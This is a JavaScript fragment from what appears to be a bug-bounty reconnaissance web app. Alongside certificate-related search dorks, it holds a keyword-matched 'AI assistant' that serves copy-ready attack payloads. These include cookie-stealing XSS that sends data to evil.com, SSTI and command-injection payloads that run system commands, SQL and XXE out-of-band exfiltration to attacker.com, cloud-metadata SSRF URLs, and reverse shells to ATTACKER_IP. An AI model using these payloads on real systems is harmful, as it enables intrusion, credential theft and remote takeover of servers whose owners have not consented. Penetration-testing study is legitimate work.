      {label:"CAA record info", query:'site:{domain} "CAA" "letsencrypt" | "digicert" | "comodo"'},
      {label:"OCSP stapling", query:'site:{domain} "OCSP" | "Online Certificate Status"'},
      {label:"Short key length", query:'site:{domain} "RSA 1024" | "512-bit" | "1024-bit" "certificate"'},
      {label:"SAN certificate details", query:'site:crt.sh "{domain}" "Subject Alternative Name"'},
      {label:"Revoked certs", query:'site:{domain} "certificate has been revoked" | "OCSP revoked"'},
      {label:"CT log monitoring", query:'site:transparencyreport.google.com "{domain}"'},
      {label:"Wildcard cert abuse", query:'site:{domain} "*.{domain}" certificate'},
      {label:"Pin mismatch", query:'site:{domain} "PublicKeyPins" | "HPKP" pin mismatch'},
      {label:"DH param weakness", query:'site:{domain} "Diffie-Hellman" "weak" | "logjam" | "512-bit"'},
      {label:"Extended Validation cert", query:'site:{domain} "Extended Validation" | "EV certificate" "secure"'},
      {label:"Wildcard cert exposed", query:'site:crt.sh "*.{domain}" -www -mail'},
      {label:"Cert issued to wrong entity", query:'site:{domain} "certificate" "mismatch" | "wrong domain" | "not valid"'},
      {label:"Public cert details", query:'site:crt.sh | site:sslshopper.com "{domain}"'},
      {label:"TLS downgrade possible", query:'site:{domain} "SSLv2" | "SSLv3" | "DROWN" "vulnerability"'},
    ]
  },
];

/* ── Count total dorks ── */
const TOTAL_DORKS = DORK_CATEGORIES.reduce((a,c)=>a+c.dorks.length,0);

const SRC_LABELS = {
  hackertarget:"HackerTarget", urlscan:"URLScan.io", crtsh:"crt.sh", jldc:"JLDC",
  certspotter:"CertSpotter", rapiddns:"RapidDNS", dnsrepo:"DNSRepo",
  wayback_sub:"Wayback", github:"GitHub", shodan:"Shodan", censys:"Censys",
  wayback:"Wayback", commoncrawl:"CommonCrawl", otx:"AlienVault OTX", urlscan_ep:"URLScan.io",
};
const EP_LABELS = {wayback:"Wayback Machine", commoncrawl:"Common Crawl", otx:"AlienVault OTX", urlscan:"URLScan.io"};

const QUOTES = [
  {text:"Reconnaissance is 80% of the hack — know your target better than they know themselves.",by:"— The Hacker's Mindset"},
  {text:"The quieter you become, the more you are able to observe and understand.",by:"— Kali Linux Philosophy"},
  {text:"Every system is hackable — if you invest enough time to truly understand it.",by:"— Unknown"},
  {text:"Finding subdomains is easy. Finding the ones that matter is the real art.",by:"— Recon Philosophy"},
  {text:"Automation finds quantity. Curiosity uncovers quality.",by:"— Bug Hunter's Creed"},
  {text:"Most critical vulnerabilities aren't in complex code — they hide in forgotten endpoints.",by:"— OWASP Insight"},
  {text:"One person's forgotten staging server is another hunter's P1 vulnerability.",by:"— Bug Bounty Folklore"},
  {text:"In bug bounty, patience is your best tool and curiosity is your best weapon.",by:"— Bug Bounty Handbook"},
  {text:"There are only two types of systems: those that have been hacked, and those that will be.",by:"— Unknown"},
  {text:"The best defense is understanding the offense.",by:"— Red Team Doctrine"},
];
const QUOTE = QUOTES[Math.floor(Math.random()*QUOTES.length)];

/* ══════════════════════════════════════════════
   AI SECURITY ASSISTANT — CLIENT-SIDE KNOWLEDGE BASE
   Runs 100% in browser — No server, Works on GitHub Pages
   ══════════════════════════════════════════════ */
const AI_KNOWLEDGE = {
  xss: {
    title: "XSS (Cross-Site Scripting) Payloads",
    intro: "XSS allows attackers to inject malicious scripts into web pages. Here are payload categories for testing:",
    sections: [
      {
        label: "Basic Reflected XSS",
        payloads: [
          `<script>alert(1)</script>`,
          `<script>alert('XSS')</script>`,
          `<script>alert(document.cookie)</script>`,
          `<script>confirm(1)</script>`,
          `<script>prompt(1)</script>`,
          `<img src=x onerror=alert(1)>`,
          `<img src=x onerror=alert(document.domain)>`,
          `<svg onload=alert(1)>`,
          `<body onload=alert(1)>`,
          `<iframe onload=alert(1)></iframe>`,
        ]
      },
      {
        label: "HTML Attribute XSS",
        payloads: [
          `" onmouseover="alert(1)`,
          `" onfocus="alert(1)" autofocus="`,
          `' onmouseover='alert(1)`,
          `"><img src=x onerror=alert(1)>`,
          `"><svg onload=alert(1)>`,
          `javascript:alert(1)`,
          `" onclick="alert(1)`,
          `" onerror="alert(1)`,
          `" onkeypress="alert(1)`,
          `" ondblclick="alert(1)`,
        ]
      },
      {
        label: "Filter Bypass XSS",
        payloads: [
          `<ScRiPt>alert(1)</ScRiPt>`,
          `<script>alert\`1\`</script>`,
          `<img src=x onerror=\`alert\`(1)\`>`,
          `<svg><script>alert(1)</script></svg>`,
          `<details open ontoggle=alert(1)>`,
          `<video><source onerror=alert(1)>`,
          `<audio src=x onerror=alert(1)>`,
          `<marquee onstart=alert(1)>`,
          `<object data="javascript:alert(1)">`,
          `<embed src="javascript:alert(1)">`,
        ]
      },
      {
        label: "DOM-Based XSS",
        payloads: [
          `#<img src=x onerror=alert(1)>`,
          `#"><img src=x onerror=alert(1)>`,
          `javascript:alert(document.cookie)`,
          `<script>eval(atob('YWxlcnQoMSk='))</script>`,
          `<iframe src="javascript:alert(1)">`,
          `<script>document.location='http://evil.com/?c='+document.cookie</script>`,
          `\`-alert(1)-\``,
          `';alert(1);//`,
          `\");alert(1);//`,
          `</script><script>alert(1)</script>`,
        ]
      },
      {
        label: "Stored XSS",
        payloads: [
          `<script>fetch('https://evil.com/steal?c='+btoa(document.cookie))</script>`,
          `<img src=x onerror="this.src='https://evil.com/?c='+document.cookie">`,
          `<svg onload="new Image().src='//evil.com/c?='+document.cookie">`,
          `<script>var i=new Image;i.src='//evil.com/c?c='+document.cookie</script>`,
          `<script>navigator.sendBeacon('//evil.com/c',document.cookie)</script>`,
        ]
      },
      {
        label: "CSP Bypass XSS",
        payloads: [
          `<script nonce="REPLACE_NONCE">alert(1)</script>`,
          `<base href="https://evil.com/">`,
          `<script src="data:,alert(1)"></script>`,
          `<link rel=prefetch href="https://evil.com/?c="+document.cookie>`,
          `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,
        ]
      },
    ],
    tips: [
      "Always test both GET and POST parameters",
      "Try encoding: URL-encode, HTML-entity, Unicode, Base64",
      "Test in all input fields, headers, cookies",
      "Check JSON responses and API endpoints",
      "Use Burp Suite Repeater for manual testing",
      "PortSwigger XSS labs: portswigger.net/web-security/cross-site-scripting"
    ]
  },

  ssti: {
    title: "SSTI (Server-Side Template Injection) Payloads",
    intro: "SSTI occurs when user input is embedded in a template and executed server-side. Detection and exploitation payloads:",
    sections: [
      {
        label: "Detection Payloads (Universal)",
        payloads: [
          `{{7*7}}`,
          "\${7*7}",
          `<%= 7*7 %>`,
          `#{7*7}`,
          `{{7*'7'}}`,
          "\${{7*7}}",
          `{7*7}`,
          `{{7+7}}`,
          `*{7*7}`,
          `\${7*7}`,
        ]
      },
      {
        label: "Jinja2 (Python / Flask)",
        payloads: [
          `{{config}}`,
          `{{config.items()}}`,
          `{{self.__dict__}}`,
          `{{request.environ}}`,
          `{{''.__class__.__mro__[2].__subclasses__()}}`,
          `{{''.__class__.mro()[1].__subclasses__()[40]('/etc/passwd').read()}}`,
          `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`,
          `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`,
          `{%for x in ().__class__.__base__.__subclasses__()%}{%if 'warning' in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('id').read()}}{%endif%}{%endfor%}`,
          `{{cycler.__init__.__globals__.os.popen('id').read()}}`,
        ]
      },
      {
        label: "Twig (PHP)",
        payloads: [
          `{{7*7}}`,
          `{{_self}}`,
          `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`,
          `{{app.request.server.all|join(',')}}`,
          `{{''|format('%1$s','id'|passthru)}}`,
          `{{[0]|reduce('system','id')}}`,
        ]
      },
      {
        label: "Freemarker (Java)",
        payloads: [
          "\${7*7}",
          '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}',
          "[#assign rtc=class.forName('java.lang.Runtime')]",
          '${"freemarker.template.utility.Execute"?new()("id")}',
        ]
      },
      {
        label: "Smarty (PHP)",
        payloads: [
          `{php}echo id;{/php}`,
          `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}`,
          `{system('id')}`,
          `{'id'|system}`,
        ]
      },
      {
        label: "ERB (Ruby)",
        payloads: [
          `<%= 7*7 %>`,
          `<%= system("id") %>`,
          "<%= `id` %>",
          `<%= File.open('/etc/passwd').read %>`,
          `<%= IO.popen('id').readlines() %>`,
        ]
      },
      {
        label: "Velocity (Java)",
        payloads: [
          `#set($x='')##`,
          `#set($e="e")$e.class.forName("java.lang.Runtime").getMethod("exec","".class).invoke($e.class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")`,
        ]
      },
    ],
    tips: [
      "Use {{7*7}} to detect - if output is 49 it's vulnerable",
      "Different result for {{7*7}} vs {{7*'7'}} helps identify engine",
      "Check all template parameters, not just obvious ones",
      "Try URL-encoding payloads to bypass WAF",
      "Use Tplmap tool for automated SSTI exploitation",
      "PortSwigger SSTI labs: portswigger.net/web-security/server-side-template-injection"
    ]
  },

  sqli: {
    title: "SQL Injection Payloads",
    intro: "SQL Injection allows attackers to interfere with database queries. Comprehensive payload list for testing:",
    sections: [
      {
        label: "Detection / Basic SQLi",
        payloads: [
          `'`,
          `''`,
          `'--`,
          `'-- -`,
          `';--`,
          `' OR '1'='1`,
          `' OR 1=1--`,
          `" OR "1"="1`,
          `' OR 'x'='x`,
          `1' ORDER BY 1--`,
        ]
      },
      {
        label: "Error-Based SQLi (MySQL)",
        payloads: [
          `' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--`,
          `' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--`,
          `' AND updatexml(1,concat(0x7e,(SELECT database())),1)--`,
          `' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--`,
          `' AND MAKE_SET(1,EXP(~0))--`,
          `' OR 1 GROUP BY CONCAT(version(),0x3a,FLOOR(RAND(0)*2)) HAVING MIN(0)--`,
        ]
      },
      {
        label: "UNION-Based SQLi",
        payloads: [
          `' UNION SELECT NULL--`,
          `' UNION SELECT NULL,NULL--`,
          `' UNION SELECT NULL,NULL,NULL--`,
          `' UNION SELECT 1,2,3--`,
          `' UNION SELECT table_name,2,3 FROM information_schema.tables--`,
          `' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--`,
          `' UNION SELECT username,password,3 FROM users--`,
          `' UNION ALL SELECT NULL,@@version,NULL--`,
          `' UNION SELECT NULL,user(),NULL--`,
          `' UNION SELECT NULL,database(),NULL--`,
        ]
      },
      {
        label: "Blind SQLi (Boolean)",
        payloads: [
          `' AND 1=1--`,
          `' AND 1=2--`,
          `' AND SUBSTRING(version(),1,1)='5'--`,
          `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--`,
          `' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--`,
          `1 AND 1=1`,
          `1 AND 1=2`,
          `' AND EXISTS(SELECT * FROM users)--`,
        ]
      },
      {
        label: "Time-Based Blind SQLi",
        payloads: [
          `'; IF(1=1) WAITFOR DELAY '0:0:5'--`,
          `' AND SLEEP(5)--`,
          `'; WAITFOR DELAY '0:0:5'--`,
          `' OR SLEEP(5)--`,
          `1; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--`,
          `' AND (SELECT * FROM (SELECT(SLEEP(5)))a)='`,
          `'; SELECT pg_sleep(5)--`,
          `' OR pg_sleep(5)--`,
        ]
      },
      {
        label: "Out-of-Band SQLi",
        payloads: [
          `'; EXEC master..xp_cmdshell 'nslookup your-collab.burpcollaborator.net'--`,
          `' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE id=1),'.attacker.com\\\\a'))--`,
          `'; DECLARE @q varchar(200);SET @q='\\\\'+@@version+'.attacker.com\\a';EXEC master..xp_dirtree @q--`,
        ]
      },
      {
        label: "NoSQL Injection (MongoDB)",
        payloads: [
          `{"$gt":""}`,
          `{"$ne":"invalid"}`,
          `{"$regex":".*"}`,
          `{"$where":"1==1"}`,
          `{"username":{"$ne":""},"password":{"$ne":""}}`,
          `' || '1'=='1`,
          `; return true; var x=`,
          `'; return true; //`,
        ]
      },
    ],
    tips: [
      "Use sqlmap for automated detection: sqlmap -u 'url' --dbs",
      "Always test with Burp Suite to intercept and modify requests",
      "Try in all GET/POST params, headers, cookies",
      "URL encode single quotes: %27",
      "Check for WAF and use tamper scripts in sqlmap",
      "PortSwigger SQLi labs: portswigger.net/web-security/sql-injection"
    ]
  },

  ssrf: {
    title: "SSRF (Server-Side Request Forgery) Payloads",
    intro: "SSRF forces the server to make requests to internal/external resources. Testing payloads:",
    sections: [
      {
        label: "Basic SSRF",
        payloads: [
          `http://127.0.0.1/`,
          `http://localhost/`,
          `http://[::1]/`,
          `http://0.0.0.0/`,
          `http://0/`,
          `http://0177.0.0.1/`,
          `http://2130706433/`,
          `http://017700000001/`,
          `http://0x7f000001/`,
          `http://127.1/`,
        ]
      },
      {
        label: "Cloud Metadata SSRF",
        payloads: [
          `http://169.254.169.254/latest/meta-data/`,
          `http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
          `http://169.254.169.254/latest/user-data/`,
          `http://metadata.google.internal/computeMetadata/v1/`,
          `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`,
          `http://169.254.169.254/metadata/v1/`,
          `http://100.100.100.200/latest/meta-data/ (Alibaba)`,
          `http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Azure)`,
        ]
      },
      {
        label: "Protocol Smuggling SSRF",
        payloads: [
          `file:///etc/passwd`,
          `file:///etc/hosts`,
          `file:///proc/self/environ`,
          `dict://127.0.0.1:6379/info`,
          `gopher://127.0.0.1:6379/_INFO%0d%0a`,
          `sftp://attacker.com:22/`,
          `ldap://127.0.0.1:389/`,
          `ldaps://127.0.0.1:636/`,
        ]
      },
      {
        label: "SSRF Bypass",
        payloads: [
          `http://localhost:80/`,
          `http://127.0.0.1:8080/admin`,
          `http://[0:0:0:0:0:ffff:127.0.0.1]/`,
          `http://127。0。0。1/ (Unicode dots)`,
          `http://①②⑦.⓪.⓪.①/`,
          `http://attacker.com@127.0.0.1/`,
          `http://127.0.0.1#attacker.com`,
          `http://127.0.0.1@attacker.com:80@127.0.0.1/`,
        ]
      },
    ],
    tips: [
      "Use Burp Collaborator for OOB SSRF detection",
      "Test URL params: url=, redirect=, target=, img=, src=",
      "Try IPv6, decimal, hex and octal IP notations for bypass",
      "Internal ports to test: 22,80,443,3306,6379,27017,8080,8443",
      "SSRF can lead to RCE via cloud metadata credentials"
    ]
  },

  lfi: {
    title: "LFI / RFI (File Inclusion) Payloads",
    intro: "Local/Remote File Inclusion allows reading arbitrary files or executing remote code:",
    sections: [
      {
        label: "LFI Basic",
        payloads: [
          `../etc/passwd`,
          `../../etc/passwd`,
          `../../../etc/passwd`,
          `../../../../etc/passwd`,
          `../../../../../etc/passwd`,
          `../../../../../../etc/passwd`,
          `/etc/passwd`,
          `/etc/shadow`,
          `/etc/hosts`,
          `/proc/self/environ`,
        ]
      },
      {
        label: "LFI Bypass / Encoding",
        payloads: [
          `..%2Fetc%2Fpasswd`,
          `..%252Fetc%252Fpasswd`,
          `..%c0%af etc/passwd`,
          `..%ef%bc%8fetc/passwd`,
          `....//....//etc/passwd`,
          `..\/..\/etc\/passwd`,
          `/etc/passwd%00`,
          `../../../etc/passwd%00`,
          `php://filter/convert.base64-encode/resource=index.php`,
          `php://filter/read=convert.base64-encode/resource=config.php`,
        ]
      },
      {
        label: "PHP Wrappers",
        payloads: [
          `php://input`,
          `php://filter/convert.base64-encode/resource=/etc/passwd`,
          `php://filter/string.rot13/resource=/etc/passwd`,
          `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=`,
          `expect://id`,
          `phar://`,
          `zip://`,
        ]
      },
      {
        label: "Windows LFI",
        payloads: [
          `..\\..\\windows\\win.ini`,
          `..\\..\\windows\\system32\\drivers\\etc\\hosts`,
          `C:\\Windows\\win.ini`,
          `C:\\Windows\\System32\\drivers\\etc\\hosts`,
          `C:\\boot.ini`,
          `..%5C..%5Cwindows%5Cwin.ini`,
        ]
      },
      {
        label: "Log Poisoning",
        payloads: [
          `../../../var/log/apache2/access.log`,
          `../../../var/log/nginx/access.log`,
          `../../../var/log/auth.log`,
          `../../../proc/self/fd/0`,
          `../../../var/mail/www-data`,
        ]
      },
    ],
    tips: [
      "Use null byte %00 to truncate extensions (PHP < 5.3.4)",
      "Test ?page=, ?file=, ?include=, ?path= parameters",
      "Combine with log poisoning for RCE",
      "PHP wrappers like php://filter can leak source code",
      "Try both / and \\ on Windows servers"
    ]
  },

  rce: {
    title: "RCE (Remote Code Execution) Payloads",
    intro: "RCE vulnerabilities allow attackers to execute arbitrary commands on the server:",
    sections: [
      {
        label: "Command Injection (Linux)",
        payloads: [
          `; id`,
          `& id`,
          `| id`,
          `|| id`,
          `&& id`,
          `; cat /etc/passwd`,
          `$(id)`,
          "`id`",
          `; sleep 5`,
          `| sleep 5`,
        ]
      },
      {
        label: "Command Injection (Windows)",
        payloads: [
          `& whoami`,
          `| whoami`,
          `|| whoami`,
          `&& whoami`,
          "; dir",
          `; ping -n 5 127.0.0.1`,
          `& ipconfig`,
          `| net user`,
        ]
      },
      {
        label: "Bypass Filters",
        payloads: [
          `; w'h'o'a'm'i`,
          `;who$()ami`,
          `; c'a't /etc/passwd`,
          `; /bin/c?t /etc/passwd`,
          `; /b??/c?t /etc/passwd`,
          `; {cat,/etc/passwd}`,
          "; cat${IFS}/etc/passwd",
          `;IFS=,;cat,/etc/passwd`,
        ]
      },
      {
        label: "Reverse Shells",
        payloads: [
          `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1`,
          `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
          `nc -e /bin/sh ATTACKER_IP PORT`,
          `php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'`,
          `perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'`,
        ]
      },
    ],
    tips: [
      "Replace ATTACKER_IP and PORT with your listener details",
      "Use nc -lvnp PORT to listen for reverse shells",
      "URL-encode special chars when injecting via URL params",
      "Try OOB: curl attacker.com | bash, wget attacker.com/shell.sh",
      "Use Burp Collaborator for blind RCE detection"
    ]
  },

  xxe: {
    title: "XXE (XML External Entity) Payloads",
    intro: "XXE attacks exploit XML parsers to read local files or make SSRF requests:",
    sections: [
      {
        label: "Basic XXE",
        payloads: [
          `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
          `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><root>&xxe;</root>`,
          `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>`,
          `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>`,
        ]
      },
      {
        label: "Blind XXE / OOB",
        payloads: [
          `<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd"> %dtd;]><root/>`,
          `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe; %data; %param1;]><foo/>`,
        ]
      },
    ],
    tips: [
      "Set Content-Type: application/xml",
      "Try converting JSON endpoints to accept XML",
      "Use Burp Collaborator for OOB XXE",
      "Test in file upload features (XML-based formats: docx, xlsx, svg, gpx)"
    ]
  },

  idor: {
    title: "IDOR (Insecure Direct Object Reference) Techniques",
    intro: "IDOR allows accessing other users' resources by manipulating object references:",
    sections: [
      {
        label: "URL Parameter Manipulation",
        payloads: [
          `Change ?user_id=123 to ?user_id=124`,
          `Change /profile/123 to /profile/124`,
          `Change ?order_id=ABC123 to ?order_id=ABC122`,
          `Try /api/users/1 instead of /api/users/me`,
          `Change account_number to another customer's`,
        ]
      },
      {
        label: "Body Parameter Manipulation",
        payloads: [
          `{"userId": "victim_id"}`,
          `{"account": "other_account_id"}`,
          `{"email": "victim@example.com"}`,
          `Change "id" field in POST body`,
          `Try adding isAdmin: true to JSON body`,
        ]
      },
      {
        label: "Header Manipulation",
        payloads: [
          `X-User-Id: 1`,
          `X-Account-Id: admin_id`,
          `X-Forwarded-For: 127.0.0.1`,
          `X-Original-URL: /admin`,
          `X-Custom-IP-Authorization: 127.0.0.1`,
        ]
      },
    ],
    tips: [
      "Create two accounts and test cross-account access",
      "Look for numeric IDs, UUIDs, email addresses as object references",
      "Test in API endpoints especially /api/v1/users/{id}",
      "Check all HTTP methods: GET, POST, PUT, DELETE, PATCH",
      "Try predictable IDs: increment/decrement by 1"
    ]
  },

  tools: {
    title: "Bug Bounty Essential Tools",
    intro: "Top tools for bug bounty hunting and penetration testing:",
    sections: [
      {
        label: "Recon Tools",
        payloads: [
          `subfinder -d target.com -o subs.txt`,
          `amass enum -passive -d target.com`,
          `assetfinder --subs-only target.com`,
          `httpx -l subs.txt -o live.txt`,
          `nmap -sV -sC -p- target.com`,
          `masscan -p1-65535 --rate 1000 target.com`,
          `shodan search hostname:target.com`,
          `nuclei -l live.txt -t /templates/`,
        ]
      },
      {
        label: "Web Testing Tools",
        payloads: [
          `ffuf -w wordlist.txt -u https://target.com/FUZZ`,
          `gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt`,
          `wfuzz -c -w wordlist.txt -u https://target.com/FUZZ`,
          `dirsearch -u https://target.com -e php,html,js`,
          `sqlmap -u "https://target.com/?id=1" --dbs`,
          `dalfox url "https://target.com/?q=xss" --deep-domxss`,
          `xssstrike -u "https://target.com/?q=test"`,
        ]
      },
      {
        label: "Exploitation Tools",
        payloads: [
          `burpsuite (intercept & modify HTTP requests)`,
          `metasploit framework (msf6)`,
          `ghauri (SQL injection tool)`,
          `tplmap (SSTI exploitation)`,
          `SSRFmap (SSRF exploitation)`,
          `GitTools (extract .git repos)`,
          `truffleHog (find secrets in git)`,
        ]
      },
    ],
    tips: [
      "Automate recon with bash scripts",
      "Use GitHub Dorking for sensitive info",
      "Subscribe to HackerOne and Bugcrowd programs",
      "Read writeups on hackerone.com/hacktivity",
      "Practice on HackTheBox, TryHackMe, VulnHub"
    ]
  },

  wordlists: {
    title: "Essential Wordlists & Resources",
    intro: "Recommended wordlists for fuzzing, brute-forcing, and testing:",
    sections: [
      {
        label: "Directory/File Wordlists",
        payloads: [
          `SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt`,
          `SecLists/Discovery/Web-Content/big.txt`,
          `SecLists/Discovery/Web-Content/common.txt`,
          `SecLists/Discovery/Web-Content/raft-large-files.txt`,
          `SecLists/Discovery/Web-Content/api/api-endpoints.txt`,
          `dirsearch/db/dicc.txt`,
          `FuzzDB/discovery/predictable-filepaths/`,
        ]
      },
      {
        label: "Subdomain Wordlists",
        payloads: [
          `SecLists/Discovery/DNS/subdomains-top1million-5000.txt`,
          `SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt`,
          `SecLists/Discovery/DNS/n0kovo_subdomains.txt`,
          `Amass built-in wordlists`,
        ]
      },
      {
        label: "Payload Wordlists",
        payloads: [
          `SecLists/Fuzzing/XSS/XSS-Cheat-Sheet.txt`,
          `SecLists/Fuzzing/SQLi/Generic-SQLi.txt`,
          `SecLists/Fuzzing/LFI/LFI-Jhaddix.txt`,
          `PayloadsAllTheThings (GitHub) — best resource`,
          `HackTricks (book.hacktricks.xyz) — all techniques`,
          `PortSwigger Web Security Academy — labs & tutorials`,
        ]
      },
    ],
    tips: [
      "Install SecLists: git clone https://github.com/danielmiessler/SecLists",
      "PayloadsAllTheThings: github.com/swisskyrepo/PayloadsAllTheThings",
      "HackTricks: book.hacktricks.xyz",
      "OWASP Cheat Sheet: cheatsheetseries.owasp.org",
      "PortSwigger Academy: portswigger.net/web-security"
    ]
  }
};

/* ── AI Pattern Matching ── */
function aiGetResponse(msg) {
  const m = msg.toLowerCase();
  if (m.includes("xss") || m.includes("cross site") || m.includes("cross-site scripting")) return AI_KNOWLEDGE.xss;
  if (m.includes("ssti") || m.includes("template injection") || m.includes("server side template")) return AI_KNOWLEDGE.ssti;
  if (m.includes("sql") || m.includes("sqli") || m.includes("sql injection") || m.includes("nosql")) return AI_KNOWLEDGE.sqli;
  if (m.includes("ssrf") || m.includes("server side request") || m.includes("request forgery")) return AI_KNOWLEDGE.ssrf;
  if (m.includes("lfi") || m.includes("rfi") || m.includes("file inclusion") || m.includes("local file") || m.includes("path traversal")) return AI_KNOWLEDGE.lfi;
  if (m.includes("rce") || m.includes("remote code") || m.includes("command injection") || m.includes("reverse shell")) return AI_KNOWLEDGE.rce;
  if (m.includes("xxe") || m.includes("xml external") || m.includes("xml injection")) return AI_KNOWLEDGE.xxe;
  if (m.includes("idor") || m.includes("insecure direct") || m.includes("object reference")) return AI_KNOWLEDGE.idor;
  if (m.includes("tool") || m.includes("subfinder") || m.includes("amass") || m.includes("ffuf") || m.includes("nuclei")) return AI_KNOWLEDGE.tools;
  if (m.includes("wordlist") || m.includes("seclist") || m.includes("payload list") || m.includes("resource")) return AI_KNOWLEDGE.wordlists;
  return null;
}

function aiFormatResponse(kb) {
  if (!kb) return null;
  let html = `<div class="ai-section-title">${kb.title}</div>`;
  html += `<div class="ai-info-block">${kb.intro}</div>`;
  for (const sec of kb.sections) {
    html += `<div class="ai-payload-group">
      <div class="ai-payload-label">${sec.label}</div>
      ${sec.payloads.map(p=>`<div class="ai-payload-item" data-payload="${escHtml(p)}" title="Click to copy">
        <span>${escHtml(p)}</span>
        <span class="copy-hint">copy</span>
      </div>`).join("")}
    </div>`;
  }
  if (kb.tips && kb.tips.length) {
    html += `<div class="ai-section-title">Pro Tips</div>`;
    html += `<div class="ai-info-block">${kb.tips.map(t=>`<strong>▸</strong> ${t}`).join("<br>")}</div>`;
  }
  return html;
}

function escHtml(s) {
  return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;");
}

function aiGetFallback(msg) {
  const greetings = ["hi","hello","hey","sup","yo","hola","namaste","bhai"];
  const m = msg.toLowerCase().trim();
  if (greetings.some(g=>m.startsWith(g)||m===g)) {
    return `<div class="ai-info-block">
      <strong>Hello, Hacker!</strong> 👋<br><br>
      I'm your <strong>AI Security Assistant</strong> — now powered by <span style="color:var(--cyan)">live web search</span>.<br><br>
      Type <strong>anything</strong> and I'll search the internet for real-time results:<br><br>
      <strong>▸</strong> <em>"XSS payloads 2024"</em><br>
      <strong>▸</strong> <em>"SQLi bypass WAF techniques"</em><br>
      <strong>▸</strong> <em>"SSRF cloud metadata endpoints"</em><br>
      <strong>▸</strong> <em>"nmap cheatsheet"</em><br>
      <strong>▸</strong> <em>"bug bounty tips hackerone"</em><br>
      <strong>▸</strong> <em>"RCE via SSTI jinja2"</em><br><br>
      <span style="color:var(--muted);font-size:11px">Results fetched live from the web with links you can open directly.</span>
    </div>`;
  }
  if (m.includes("help") || m.includes("what can") || m.includes("what do you")) {
    return aiGetFallback("hello");
  }
  if (m.includes("payload") || m.includes("attack") || m.includes("vuln") || m.includes("hack")) {
    return `<div class="ai-info-block">
      <strong>Be more specific!</strong> I know these attack types:<br><br>
      <strong>▸</strong> XSS (Cross-Site Scripting)<br>
      <strong>▸</strong> SSTI (Server-Side Template Injection)<br>
      <strong>▸</strong> SQLi (SQL Injection)<br>
      <strong>▸</strong> SSRF (Server-Side Request Forgery)<br>
      <strong>▸</strong> LFI/RFI (File Inclusion)<br>
      <strong>▸</strong> RCE (Remote Code Execution)<br>
      <strong>▸</strong> XXE (XML External Entity)<br>
      <strong>▸</strong> IDOR (Insecure Direct Object Reference)<br><br>
      Type any of these to get payloads!
    </div>`;
  }
  return `<div class="ai-info-block">
    I didn't quite understand that. Try asking about specific vulnerabilities:<br><br>
    <strong>"XSS payloads"</strong>, <strong>"SSTI payloads"</strong>, <strong>"SQL injection"</strong>,
    <strong>"SSRF"</strong>, <strong>"LFI"</strong>, <strong>"RCE"</strong>, <strong>"XXE"</strong>,
    <strong>"IDOR"</strong>, <strong>"tools"</strong>, <strong>"wordlists"</strong><br><br>
    <em>This assistant runs 100% in your browser — no server needed!</em>
  </div>`;
}

/* ── APP STATE ── */
const S = {
  tab:"subdomain", drawerOpen:false,
  subDomain:"", subResults:[], subScanning:false, subProgress:0, subShowProgress:false,
  subSrcStatus:{}, subFilter:"", subPage:0,
  subSources:{hackertarget:true,urlscan:true,crtsh:true,jldc:true,certspotter:true,rapiddns:true,dnsrepo:true,wayback_sub:true,github:true,shodan:true,censys:true},
  epDomain:"", epResults:[], epScanning:false, epProgress:0, epShowProgress:false,
  epSrcStatus:{}, epFilter:"", epPage:0, epFilterOpen:false, epChips:new Set(), epStatsDomain:"",
  epSources:{wayback:true,commoncrawl:true,otx:true,urlscan:true},
  dorkDomain:"", dorkSearch:"",
  aiMessages:[{role:"bot",html:aiGetFallback("hello")}],
  aiTyping:false, aiInput:"",
};
const PAGE=100; const EP_PAGE=100;

/* ══════════════════════════════════════════════
   CANVAS: Matrix Rain + Particle Network
   ══════════════════════════════════════════════ */
